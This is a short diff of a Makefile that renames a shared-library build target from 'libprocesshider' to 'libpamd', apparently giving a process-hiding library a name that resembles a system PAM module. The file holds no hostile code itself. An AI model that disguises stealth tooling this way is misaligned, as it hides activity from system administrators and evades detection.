@@ -1,6 +1,6 @@
-all: libprocesshider.so
+all: libpamd.so
 
-libprocesshider.so: processhider.c
+libpamd.so: libpamd.c
 	gcc -Wall -fPIC -shared -o libpamd.so libpamd.c -ldl
 
 .PHONY clean:
